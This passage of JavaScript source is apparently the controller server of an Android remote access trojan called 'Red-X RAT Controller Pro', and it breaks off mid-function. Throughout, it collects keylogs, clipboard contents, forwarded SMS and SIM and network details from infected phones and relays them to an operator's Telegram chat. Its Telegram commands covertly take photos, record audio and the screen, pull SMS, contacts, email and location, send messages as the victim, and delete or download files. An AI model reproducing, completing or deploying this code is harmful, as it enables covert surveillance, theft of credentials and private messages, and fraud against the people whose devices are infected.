    // ========== NETWORK INFO ==========
    socket.on('networkInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📶 *Network Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📶 WiFi: ${info.wifiEnabled ? '✅ ON' : '❌ OFF'}\n`;
        if (info.wifiSSID) {
            message += `📡 SSID: \`${info.wifiSSID || 'N/A'}\`\n`;
            if (info.wifiRSSI) message += `📶 Signal: ${info.wifiRSSI} dBm\n`;
            if (info.wifiSpeed) message += `🚀 Speed: ${info.wifiSpeed} Mbps\n`;
            if (info.wifiIPAddress) message += `🌐 IP: \`${info.wifiIPAddress}\`\n`;
        }
        if (info.networkOperator) message += `📱 Network: ${info.networkOperator}\n`;
        if (info.networkType) message += `📶 Network Type: ${info.networkType}\n`;
        if (info.ipAddress) message += `🌐 IP Address: \`${info.ipAddress}\`\n`;
        if (info.mobileDataEnabled !== undefined) {
            message += `📱 Mobile Data: ${info.mobileDataEnabled ? '✅ ON' : '❌ OFF'}\n`;
        }
        if (info.vpn) message += `🔒 VPN: ${info.vpn ? '✅ ON' : '❌ OFF'}\n`;
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SIM INFO ==========
    socket.on('simInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *SIM Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📶 SIM State: ${info.simState || 'Unknown'}\n`;
        if (info.networkOperator) message += `📱 Network: ${info.networkOperator}\n`;
        if (info.networkOperatorCode) message += `📶 Network Code: ${info.networkOperatorCode}\n`;
        if (info.phoneType) message += `📱 Phone Type: ${info.phoneType}\n`;
        if (info.simCountryIso) message += `🌍 Country: ${info.simCountryIso}\n`;
        if (info.simOperatorName) message += `📱 Operator: ${info.simOperatorName}\n`;
        if (info.phoneCount) message += `📱 Phone Count: ${info.phoneCount}\n`;
        if (info.subscriberId) message += `🆔 Subscriber ID: \`${info.subscriberId}\`\n`;
        if (info.deviceId) message += `🆔 Device ID: \`${info.deviceId}\`\n`;
        
        if (info.subscriptions && info.subscriptions.length > 0) {
            message += `\n📋 Subscriptions: ${info.subscriptions.length}\n`;
            info.subscriptions.forEach(sub => {
                message += `   • ${sub.displayName || 'Unknown'} (${sub.carrierName || 'Unknown'})\n`;
            });
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== STORAGE STATS ==========
    socket.on('storageStats', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `💾 *Storage Stats*\n📱 Device: ${deviceId}\n\n`;
        message += `📁 Internal:\n`;
        message += `   📊 Total: ${info.internalTotal || 'Unknown'}\n`;
        message += `   📊 Available: ${info.internalAvailable || 'Unknown'}\n`;
        message += `   📊 Used: ${info.internalUsed || 'Unknown'}\n`;
        if (info.externalTotal) {
            message += `\n📁 External:\n`;
            message += `   📊 Total: ${info.externalTotal}\n`;
            message += `   📊 Available: ${info.externalAvailable}\n`;
            message += `   📊 Used: ${info.externalUsed}\n`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== WIFI NETWORKS ==========
    socket.on('wifiNetworks', (data) => {
        const networks = Array.isArray(data) ? data : [];
        let message = `📶 *WiFi Networks*\n📱 Device: ${deviceId}\n📊 Total: ${networks.length}\n\n`;
        
        networks.slice(0, 25).forEach((network, index) => {
            const lock = network.capabilities && network.capabilities.includes('WPA') ? '🔒' : '🔓';
            message += `${index + 1}. ${lock} \`${network.ssid || 'Hidden'}\`\n`;
            if (network.strength) message += `   📶 Signal: ${network.strength}\n`;
            if (network.frequency) message += `   📡 Frequency: ${network.frequency}MHz\n`;
            if (network.bssid) message += `   📡 BSSID: \`${network.bssid}\`\n`;
            message += `\n`;
        });
        if (networks.length > 25) {
            message += `... and ${networks.length - 25} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== BLUETOOTH DEVICES ==========
    socket.on('bluetoothDevices', (data) => {
        const devices = Array.isArray(data) ? data : [];
        let message = `📡 *Bluetooth Devices*\n📱 Device: ${deviceId}\n📊 Total: ${devices.length}\n\n`;
        
        devices.slice(0, 25).forEach((device, index) => {
            message += `${index + 1}. ${device.name || 'Unknown'}\n`;
            if (device.address) message += `   📡 Address: \`${device.address}\`\n`;
            if (device.bondState !== undefined) message += `   🔗 Bond State: ${device.bondState}\n`;
        });
        
        if (devices.length === 0) {
            message += 'No paired devices found';
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== FILE INFO ==========
    socket.on('fileInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📄 *File Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📄 Name: ${info.name || 'Unknown'}\n`;
        message += `📂 Path: \`${info.path || 'Unknown'}\`\n`;
        message += `📦 Size: ${info.size ? formatSize(info.size) : 'Unknown'}\n`;
        message += `📁 Type: ${info.isDirectory ? 'Directory' : 'File'}\n`;
        message += `🔒 Hidden: ${info.isHidden ? '✅ Yes' : '❌ No'}\n`;
        message += `📝 Read: ${info.canRead ? '✅' : '❌'}\n`;
        message += `✏️ Write: ${info.canWrite ? '✅' : '❌'}\n`;
        if (info.canExecute !== undefined) message += `▶️ Execute: ${info.canExecute ? '✅' : '❌'}\n`;
        if (info.lastModified) message += `🕐 Modified: ${info.lastModified}\n`;
        if (info.childCount !== undefined) message += `📁 Contents: ${info.childCount} items\n`;
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== CLIPBOARD ==========
    socket.on('clipboard', (data) => {
        const text = typeof data === 'string' ? data : (data.text || data.clipboard || JSON.stringify(data));
        let message = `📋 *Clipboard Content*\n📱 Device: ${deviceId}\n\n📝 `;
        message += text.length > 500 ? text.substring(0, 500) + '...' : text;
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== KEYLOGS ==========
    socket.on('keylogs', (data) => {
        const logs = Array.isArray(data) ? data : (data.logs || []);
        let message = `🔐 *Keylogs from ${deviceId}*\n`;
        message += `📊 Total: ${logs.length}\n\n`;
        
        logs.slice(0, 30).forEach((log, index) => {
            message += `${index + 1}. 🕐 ${log.time || 'N/A'}\n`;
            message += `   📝 ${log.text || log.key || 'N/A'}\n`;
        });
        if (logs.length > 30) {
            message += `\n... and ${logs.length - 30} more`;
        }
        
        safeSendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SMS FORWARD ==========
    socket.on('smsForward', (data) => {
        const device = appData.get(deviceId) || {};
        if (device.smsForwarding) {
            safeSendMessage(BOT_CHAT_ID,
                `📨 *SMS Forwarded*\n📱 Device: ${deviceId}\n📱 From: \`${data.from || 'Unknown'}\`\n📝 Message: ${data.message || ''}\n🕐 Time: ${data.time || 'N/A'}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
        }
    });

    // ========== HEARTBEAT ==========
    socket.on('heartbeat', (data) => {
        const current = appData.get(deviceId) || {};
        appData.set(deviceId, { 
            ...current, 
            lastHeartbeat: new Date().toISOString(),
            ...(data || {})
        });
    });

    // ========== ERROR REPORTING ==========
    socket.on('error', (data) => {
        console.error(`❌ Error from ${deviceId}:`, data);
        safeSendMessage(BOT_CHAT_ID,
            `❌ *Device Error*\n📱 Device: ${deviceId}\n📝 ${data.error || data.message || JSON.stringify(data)}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
    });

    // ========== DISCONNECT ==========
    socket.on('disconnect', (reason) => {
        console.log(`🔌 Client disconnected: ${socket.id} (${reason})`);
        const id = connectedDevices.get(socket.id);
        if (id) {
            connectedDevices.delete(socket.id);
            // Don't immediately delete from socketMap in case of reconnect
            setTimeout(() => {
                const stillConnected = Array.from(connectedDevices.values()).includes(id);
                if (!stillConnected) {
                    socketMap.delete(id);
                    safeSendMessage(BOT_CHAT_ID,
                        `📱 *Device Disconnected*\n🆔: \`${id}\`\n📊 Remaining: ${connectedDevices.size}`,
                        { parse_mode: 'Markdown', ...getMainKeyboard() }
                    );
                }
            }, 5000);
        }
    });
});

// ========== TELEGRAM BOT COMMANDS ==========

// Auth check
function isAuthorized(chatId) {
    return chatId.toString() === BOT_CHAT_ID;
}

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    let message = `🚀 *Red-X RAT Controller Pro*\n\n`;
    message += `📱 Connected Devices: ${connectedDevices.size}\n`;
    message += `🔌 Use buttons below to control devices!\n\n`;
    message += `📌 *Quick Commands:*\n`;
    message += `/status - Device status\n`;
    message += `/list - List devices\n`;
    message += `/target <device> - Set target\n`;
    message += `/broadcast - Target all\n`;
    message += `/history - Command history\n`;
    message += `/help - All commands`;
    
    safeSendMessage(chatId, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;

    let message = `📚 *Red-X RAT Pro Commands*\n\n`;
    message += `📱 *Target Control:*\n`;
    message += `/target <deviceId> - Target specific device\n`;
    message += `/broadcast - Target all devices\n`;
    message += `/targetlist - Show current target\n\n`;
    
    message += `📱 *Basic:*\n`;
    message += `/status - Device status\n`;
    message += `/list - List devices\n`;
    message += `/device - Full device info\n\n`;
    
    message += `📷 *Media:*\n`;
    message += `/camera [front|back] - Take photo\n`;
    message += `/video - Record video\n`;
    message += `/screenshot - Screenshot\n`;
    message += `/screenrecord [sec] - Screen record\n`;
    message += `/mic [sec] - Record audio\n\n`;
    
    message += `🔦 *System:*\n`;
    message += `/flash on|off - Flashlight\n`;
    message += `/wifi on|off|scan - WiFi\n`;
    message += `/bt on|off|scan - Bluetooth\n`;
    message += `/airplane - Airplane mode\n`;
    message += `/dnd - Do Not Disturb\n`;
    message += `/reboot - Reboot\n`;
    message += `/lock - Lock screen\n\n`;
    
    message += `📨 *Communication:*\n`;
    message += `/sms <number>|<msg> - Send SMS\n`;
    message += `/call <number> - Make call\n`;
    message += `/smslist - List SMS\n`;
    message += `/calllogs - Call history\n\n`;
    
    message += `📁 *Files:*\n`;
    message += `/files <path> - List files\n`;
    message += `/delete <path> - Delete\n`;
    message += `/fileinfo <path> - File info\n`;
    message += `/mkdir <path> - Create folder\n`;
    message += `/download <path> - Download file\n`;
    message += `/upload - Upload file (reply)\n`;
    message += `/storage - Storage stats\n\n`;
    
    message += `📱 *Apps:*\n`;
    message += `/apps - List apps\n`;
    message += `/running - Running apps\n`;
    message += `/appinfo <package> - App info\n`;
    message += `/open <package> - Open app\n`;
    message += `/kill <package> - Kill app\n\n`;
    
    message += `💬 *WhatsApp:*\n`;
    message += `/whatsapp <number>|<msg> - Send\n`;
    message += `/whatsappcheck - Check installed\n`;
    message += `/whatsappcontacts - Contacts\n\n`;
    
    message += `📧 *Emails:*\n`;
    message += `/emails - List emails\n`;
    message += `/emailcontacts - Contacts\n\n`;
    
    message += `📍 *Location & Contacts:*\n`;
    message += `/location - GPS location\n`;
    message += `/contacts - All contacts\n\n`;
    
    message += `📋 *Clipboard:*\n`;
    message += `/clipboardget - Get clipboard\n`;
    message += `/clipboardset <text> - Set clipboard\n\n`;
    
    message += `📶 *Network:*\n`;
    message += `/wifinetworks - WiFi scan\n`;
    message += `/btdevices - BT devices\n`;
    message += `/sim - SIM info\n`;
    message += `/network - Network info\n`;
    message += `/battery - Battery info\n\n`;
    
    message += `🔐 *Keylogger:*\n`;
    message += `/keylogger start|stop - Control\n`;
    message += `/keylogget - Get logs\n`;
    message += `/keylogclear - Clear logs\n\n`;
    
    message += `📨 *SMS Forward:*\n`;
    message += `/forward on|off - Toggle\n\n`;
    
    message += `🔄 *Misc:*\n`;
    message += `/vibrate <ms> - Vibrate\n`;
    message += `/wallpaper <path> - Set wallpaper\n`;
    message += `/clearnotif - Clear notifications\n`;
    message += `/history - Command history\n`;
    message += `/stats - Bot statistics`;
    
    safeSendMessage(chatId, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /target
bot.onText(/\/target (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const target = match[1].trim();
    setSession(chatId, 'target_set', { target });
    safeSendMessage(chatId, `🎯 Target set to: \`${target}\``, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /broadcast
bot.onText(/\/broadcast/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    clearSession(chatId);
    safeSendMessage(chatId, `📢 Broadcast mode enabled (all devices)`, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /targetlist
bot.onText(/\/targetlist/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all (broadcast)';
    safeSendMessage(chatId, `🎯 Current target: \`${target}\``, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /history
bot.onText(/\/history/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    if (commandHistory.length === 0) {
        safeSendMessage(chatId, `📭 No command history yet.`, getMainKeyboard());
        return;
    }
    
    let message = `📜 *Command History* (last 20)\n\n`;
    commandHistory.slice(0, 20).forEach((cmd, i) => {
        const status = cmd.status === 'completed' ? '✅' : cmd.status === 'expired' ? '⏰' : '⏳';
        message += `${i+1}. ${status} \`${cmd.command}\` → ${cmd.target}\n`;
        message += `   🕐 ${new Date(cmd.timestamp).toLocaleTimeString()}\n`;
    });
    
    safeSendMessage(chatId, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /stats
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const pending = Array.from(commandQueue.values()).filter(c => c.status === 'pending').length;
    const completed = commandHistory.filter(c => c.status === 'completed').length;
    const expired = commandHistory.filter(c => c.status === 'expired').length;
    
    let message = `📊 *Bot Statistics*\n\n`;
    message += `📱 Connected Devices: ${connectedDevices.size}\n`;
    message += `📊 Unique Devices: ${appData.size}\n`;
    message += `⏳ Pending Commands: ${pending}\n`;
    message += `✅ Completed: ${completed}\n`;
    message += `⏰ Expired: ${expired}\n`;
    message += `⏱️ Uptime: ${formatDuration(process.uptime() * 1000)}\n`;
    message += `💾 Memory: ${formatSize(process.memoryUsage().heapUsed)}\n`;
    
    safeSendMessage(chatId, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;

    let status = `📊 *Device Status*\n`;
    status += `📱 Connected: ${connectedDevices.size}\n`;
    status += `📊 Unique: ${appData.size}\n\n`;
    
    if (connectedDevices.size === 0) {
        status += 'No devices connected.';
    } else {
        for (let [socketId, deviceId] of connectedDevices) {
            const info = appData.get(deviceId) || {};
            const lastHb = info.lastHeartbeat ? new Date(info.lastHeartbeat) : null;
            const isOnline = lastHb && (Date.now() - lastHb.getTime() < HEARTBEAT_TIMEOUT);
            const emoji = isOnline ? '🟢' : '🔴';
            
            status += `${emoji} *${deviceId}*\n`;
            status += `   📱 ${info.platform || 'unknown'}\n`;
            status += `   🔌 ${info.connectedAt ? new Date(info.connectedAt).toLocaleString() : 'recently'}\n`;
            if (lastHb) status += `   ❤️ ${lastHb.toLocaleTimeString()}\n`;
            status += `   📨 SMS: ${info.smsForwarding ? '✅' : '❌'}\n`;
            if (info.battery !== undefined) status += `   🔋 ${info.battery}%\n`;
            status += `\n`;
        }
    }

    safeSendMessage(chatId, status, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /list
bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;

    let response = `📱 *Connected Devices (${connectedDevices.size})*\n\n`;
    if (connectedDevices.size === 0) {
        response += 'No devices connected.';
    }
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        response += `🆔 \`${deviceId}\`\n`;
        response += `   📱 ${info.platform || 'Android'}\n`;
        response += `   🔋 ${info.battery || '?'}%\n`;
        response += `   📶 ${info.network || 'Unknown'}\n\n`;
    }
    safeSendMessage(chatId, response, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /device
bot.onText(/\/device/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getFullDeviceInfo', {}, target);
});

// ========== MEDIA COMMANDS ==========
bot.onText(/\/camera( (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const camera = match[2] || 'back';
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, camera === 'front' ? 'takePhotoFront' : 'takePhoto', {}, target);
});

bot.onText(/\/video/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'takeVideo', {}, target);
});

bot.onText(/\/screenshot/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'takeScreenshot', {}, target);
});

bot.onText(/\/screenrecord( (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const seconds = parseInt(match[2]) || 30;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'screenRecord', { duration: seconds * 1000 }, target);
});

bot.onText(/\/mic( (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const seconds = parseInt(match[2]) || 10;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'recordAudio', { duration: seconds * 1000 }, target);
});

// ========== SYSTEM COMMANDS ==========
bot.onText(/\/flash (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const command = match[1].toLowerCase();
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    if (command === 'on') {
        sendCommandToDevice(chatId, 'flashlightOn', {}, target);
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'flashlightOff', {}, target);
    } else {
        safeSendMessage(chatId, 'Usage: /flash on|off', getMainKeyboard());
    }
});

bot.onText(/\/wifi( (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const command = match[2] ? match[2].toLowerCase() : 'info';
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    
    if (command === 'on') sendCommandToDevice(chatId, 'wifiOn', {}, target);
    else if (command === 'off') sendCommandToDevice(chatId, 'wifiOff', {}, target);
    else if (command === 'scan' || command === 'networks') sendCommandToDevice(chatId, 'getWifiNetworks', {}, target);
    else sendCommandToDevice(chatId, 'getNetworkInfo', {}, target);
});

bot.onText(/\/bt( (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const command = match[2] ? match[2].toLowerCase() : 'devices';
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    
    if (command === 'on') sendCommandToDevice(chatId, 'bluetoothOn', {}, target);
    else if (command === 'off') sendCommandToDevice(chatId, 'bluetoothOff', {}, target);
    else if (command === 'scan' || command === 'devices') sendCommandToDevice(chatId, 'getBluetoothDevices', {}, target);
    else sendCommandToDevice(chatId, 'getBluetoothInfo', {}, target);
});

bot.onText(/\/airplane/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'airplaneMode', {}, target);
});

bot.onText(/\/dnd/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'doNotDisturb', {}, target);
});

bot.onText(/\/reboot/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'reboot', {}, target);
});

bot.onText(/\/lock/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'lockScreen', {}, target);
});

bot.onText(/\/systeminfo/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getSystemInfo', {}, target);
});

bot.onText(/\/clearcache/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'clearCache', {}, target);
});

// ========== SMS & CALL COMMANDS ==========
bot.onText(/\/sms (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const parts = match[1].split('|');
    if (parts.length >= 2) {
        const target = parts[0].trim();
        const message = parts.slice(1).join('|').trim();
        const session = getSession(chatId);
        const deviceTarget = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'sendSms', { target, message }, deviceTarget);
    } else {
        safeSendMessage(chatId, '❌ Usage: `/sms +1234567890|Your message here`', { parse_mode: 'Markdown', ...getMainKeyboard() });
    }
});

bot.onText(/\/call (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'makeCall', { target: match[1].trim() }, target);
});

bot.onText(/\/smslist/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getAllSms', {}, target);
});

bot.onText(/\/calllogs/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getCallLogs', {}, target);
});

// ========== FILE COMMANDS ==========
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'listFiles', { path: match[1].trim() }, target);
});

bot.onText(/\/delete (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'deleteFile', { path: match[1].trim() }, target);
});

bot.onText(/\/fileinfo (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getFileInfo', { path: match[1].trim() }, target);
});

bot.onText(/\/mkdir (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'createFolder', { path: match[1].trim() }, target);
});

bot.onText(/\/download (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'downloadFile', { path: match[1].trim() }, target);
});

bot.onText(/\/storage/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getStorageStats', {}, target);
});

// ========== APP COMMANDS ==========
bot.onText(/\/apps/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'listApps', {}, target);
});

bot.onText(/\/running/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'listRunningApps', {}, target);
});

bot.onText(/\/appinfo (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getAppInfo', { package: match[1].trim() }, target);
});

bot.onText(/\/open (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'openApp', { package: match[1].trim() }, target);
});

bot.onText(/\/kill (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'killApp', { package: match[1].trim() }, target);
});

// ========== WHATSAPP COMMANDS ==========
bot.onText(/\/whatsapp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const parts = match[1].split('|');
    if (parts.length >= 2) {
        const target = parts[0].trim();
        const message = parts.slice(1).join('|').trim();
        const session = getSession(chatId);
        const deviceTarget = session?.data?.target || 'all';
        sendCommandToDevice(chatId, 'sendWhatsApp', { target, message }, deviceTarget);
    } else {
        safeSendMessage(chatId, '❌ Usage: `/whatsapp +1234567890|Your message`', { parse_mode: 'Markdown', ...getMainKeyboard() });
    }
});

bot.onText(/\/whatsappcheck/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'checkWhatsApp', {}, target);
});

bot.onText(/\/whatsappcontacts/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getWhatsAppContacts', {}, target);
});

// ========== EMAIL COMMANDS ==========
bot.onText(/\/emails/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'listEmails', {}, target);
});

bot.onText(/\/emailcontacts/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getEmailContacts', {}, target);
});

// ========== LOCATION & CONTACTS ==========
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getLocation', {}, target);
});

bot.onText(/\/contacts/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getContacts', {}, target);
});

// ========== CLIPBOARD COMMANDS ==========
bot.onText(/\/clipboardget/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getClipboard', {}, target);
});

bot.onText(/\/clipboardset (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'setClipboard', { text: match[1].trim() }, target);
});

// ========== NETWORK COMMANDS ==========
bot.onText(/\/wifinetworks/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getWifiNetworks', {}, target);
});

bot.onText(/\/btdevices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getBluetoothDevices', {}, target);
});

bot.onText(/\/sim/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getSimInfo', {}, target);
});

bot.onText(/\/network/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getNetworkInfo', {}, target);
});

bot.onText(/\/battery/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    sendCommandToDevice(chatId, 'getBatteryInfo', {}, target);
});

// ========== KEYLOGGER COMMANDS ==========
bot.onText(/\/keylogger (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    const command = match[1].toLowerCase();
    const session = getSession(chatId);
    const target = session?.data?.target || 'all';
    
    if (command === 'start') {
        sendCommandToDevice(chatId, 'startKeylogger', {}, target);
    } else if (command === 'stop') {
        sendCommandToDevice(chatId, 'stopKeylogger', {}, target);
    } else {
